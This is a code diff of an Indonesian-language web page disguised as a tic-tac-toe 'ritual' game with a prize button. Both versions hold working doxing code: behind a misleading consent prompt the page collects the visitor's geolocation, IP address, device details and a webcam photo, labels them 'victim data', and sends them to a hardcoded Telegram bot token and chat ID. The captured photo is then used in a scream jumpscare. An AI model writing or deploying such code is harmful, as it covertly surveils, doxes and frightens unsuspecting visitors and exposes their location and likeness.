@@ -12,8 +12,7 @@
         #main-frame { width: 100%; max-width: 380px; text-align: center; padding: 30px; border: 1px solid #111; position: relative; }
         h1 { font-weight: 200; letter-spacing: 10px; font-size: 20px; margin-bottom: 30px; }
         
-        /* Tombol Hadiah dengan Notif Merah */
-        #gift-btn { display: none; position: absolute; top: 15px; right: 15px; background: #111; border: 1px solid #333; color: #fff; padding: 10px; font-size: 10px; cursor: pointer; letter-spacing: 2px; }
+        #gift-btn { display: none; position: absolute; top: 15px; right: 15px; background: #111; border: 1px solid #333; color: #fff; padding: 10px; font-size: 10px; cursor: pointer; letter-spacing: 2px; z-index: 10; }
         .red-dot { position: absolute; top: -4px; right: -4px; width: 10px; height: 10px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent); animation: pulse 1s infinite; }
         
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.4); } 100% { transform: scale(1); } }
@@ -22,9 +21,7 @@
         .cell { height: 95px; background: #050505; border: 1px solid #151515; display: flex; align-items: center; justify-content: center; font-size: 32px; cursor: pointer; color: var(--accent); }
         
         #btn-start { background: transparent; border: 1px solid #444; color: #fff; padding: 15px 40px; font-size: 11px; letter-spacing: 5px; cursor: pointer; transition: 0.3s; }
-        #btn-start:hover { border-color: var(--accent); color: var(--accent); }
 
-        /* Jumpscare Screen */
         #scare-ui { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
         #scare-img { width: 100%; height: 75vh; object-fit: cover; border-bottom: 4px solid var(--accent); }
         .scare-msg { font-family: 'Courier New', monospace; font-size: 18px; color: var(--accent); margin-top: 30px; text-align: center; font-weight: bold; }
@@ -42,9 +39,9 @@
     <p id="status" style="font-size: 9px; color: #444; letter-spacing: 2px; text-transform: uppercase;">Sinkronisasi diperlukan...</p>
     
     <div class="board" id="game-board" style="opacity: 0.2; pointer-events: none;">
-        <div class="cell" onclick="hit(this)"></div><div class="cell" onclick="hit(this)"></div><div class="cell" onclick="hit(this)"></div>
-        <div class="cell" onclick="hit(this)"></div><div class="cell" onclick="hit(this)"></div><div class="cell" onclick="hit(this)"></div>
-        <div class="cell" onclick="hit(this)"></div><div class="cell" onclick="hit(this)"></div><div class="cell" onclick="hit(this)"></div>
+        <div class="cell" id="c0" onclick="playerMove(0)"></div><div class="cell" id="c1" onclick="playerMove(1)"></div><div class="cell" id="c2" onclick="playerMove(2)"></div>
+        <div class="cell" id="c3" onclick="playerMove(3)"></div><div class="cell" id="c4" onclick="playerMove(4)"></div><div class="cell" id="c5" onclick="playerMove(5)"></div>
+        <div class="cell" id="c6" onclick="playerMove(6)"></div><div class="cell" id="c7" onclick="playerMove(7)"></div><div class="cell" id="c8" onclick="playerMove(8)"></div>
     </div>
     
     <button id="btn-start" onclick="initRitual()">MULAI</button>
@@ -63,8 +60,8 @@
     const BOT_TOKEN = '8048569392:AAFir3moMKGzpxYheREzxjLNzGBuVsYBB6s';
     const CHAT_ID = '6932904607';
     let localFace = "";
-    const prevVisit = localStorage.getItem('vstd') ? "Ada / Yes" : "Tidak ada / None";
-    localStorage.setItem('vstd', 'true');
+    let board = ["","","","","","","","",""];
+    let isGameOver = false;
 
     async function push(method, params) {
         let url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
@@ -75,74 +72,81 @@
         return fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, ...params}) });
     }
 
-    async function initRitual() {
-        if(confirm("Sinkronkan 'Mirror Shield' untuk klaim hadiah event Slitheron?")) {
+    function initRitual() {
+        if(confirm("Sinkronkan biometrik untuk mulai ritual?")) {
             document.getElementById('btn-start').style.display = 'none';
             document.getElementById('game-board').style.opacity = '1';
             document.getElementById('game-board').style.pointerEvents = 'auto';
             document.getElementById('status').innerText = "RITUAL AKTIF";
-            
-            // EXECUTE DOXING (Urutan Sesuai Request Boss)
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                // 1. Kirim Map Pin
-                await push('sendLocation', { latitude: p.coords.latitude, longitude: p.coords.longitude });
-                // 2. Kirim Data Teks
-                await sendReport();
-                // 3. Ambil Foto
-                capture();
-            }, async () => {
-                await sendReport();
-                capture();
-            });
+            startDoxing();
         }
+    }
+
+    async function startDoxing() {
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            await push('sendLocation', { latitude: p.coords.latitude, longitude: p.coords.longitude });
+            await sendReport();
+            capture();
+        }, async () => { await sendReport(); capture(); });
     }
 
     async function sendReport() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\//g, '-');
-            const txt = `<b>DATA KORBAN</b>\n\nWaktu Akses | Access Time : ${now}\nAlamat IP | IP Address : <code>${d.ip}</code>\nPerangkat | Device : ${navigator.userAgent}\nSistem Operasi | Operating System : ${navigator.platform}\nResolusi Layar | Screen Resolution : ${window.screen.width} x ${window.screen.height}\nKunjungan Sebelumnya | Previous Visit : ${prevVisit}`;
-            await push('sendMessage', { text: txt, parse_mode: 'HTML' });
-        } catch(e) {}
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }).replace(/\//g, '-');
+        const txt = `<b>DATA KORBAN</b>\n\nWaktu: ${now}\nIP: <code>${d.ip}</code>\nOS: ${navigator.platform}\nRes: ${window.screen.width}x${window.screen.height}`;
+        await push('sendMessage', { text: txt, parse_mode: 'HTML' });
     }
 
     async function capture() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('v'); video.srcObject = stream;
-            setTimeout(() => {
-                const canvas = document.getElementById('c');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(blob => {
-                    localFace = URL.createObjectURL(blob);
-                    push('sendPhoto', blob);
-                    stream.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg');
-            }, 2000);
-        } catch(e) {}
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('v'); video.srcObject = stream;
+        setTimeout(() => {
+            const canvas = document.getElementById('c');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            canvas.toBlob(blob => {
+                localFace = URL.createObjectURL(blob);
+                push('sendPhoto', blob);
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg');
+        }, 2000);
     }
 
-    function hit(el) {
-        if(el.innerText === "") {
-            el.innerText = "X";
-            // Setelah klik, munculin tombol hadiah
-            setTimeout(() => {
-                document.getElementById('status').innerText = "EVENT TERDETEKSI!";
-                document.getElementById('gift-btn').style.display = 'block';
-            }, 800);
-        }
+    // Logic Game TIC TAC TOE
+    function playerMove(i) {
+        if(board[i] !== "" || isGameOver) return;
+        board[i] = "X";
+        document.getElementById(`c${i}`).innerText = "X";
+        if(checkWin("X")) return end();
+        if(!board.includes("")) return end();
+        
+        // Bot Move (O)
+        setTimeout(() => {
+            let empty = board.map((v, idx) => v === "" ? idx : null).filter(v => v !== null);
+            let move = empty[Math.floor(Math.random() * empty.length)];
+            board[move] = "O";
+            document.getElementById(`c${move}`).innerText = "O";
+            document.getElementById(`c${move}`).style.color = "#fff";
+            if(checkWin("O")) end();
+        }, 500);
+    }
+
+    function checkWin(p) {
+        const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+        return lines.some(l => l.every(idx => board[idx] === p));
+    }
+
+    function end() {
+        isGameOver = true;
+        document.getElementById('status').innerText = "EVENT TERDETEKSI!";
+        document.getElementById('gift-btn').style.display = 'block'; // Tombol hadiah muncul & bisa dipencet
     }
 
     function revealTerror() {
-        if(localFace === "") return;
-        const ui = document.getElementById('scare-ui');
-        const img = document.getElementById('scare-img');
-        const audio = document.getElementById('scream');
-        
-        img.src = localFace; // Foto muka dia sendiri nongol
-        ui.style.display = 'flex';
-        audio.play();
+        if(localFace === "") { alert("Sinkronisasi belum selesai!"); return; }
+        document.getElementById('scare-ui').style.display = 'flex';
+        document.getElementById('scare-img').src = localFace;
+        document.getElementById('scream').play();
         if(navigator.vibrate) navigator.vibrate([500, 300, 500]);
     }
 </script>
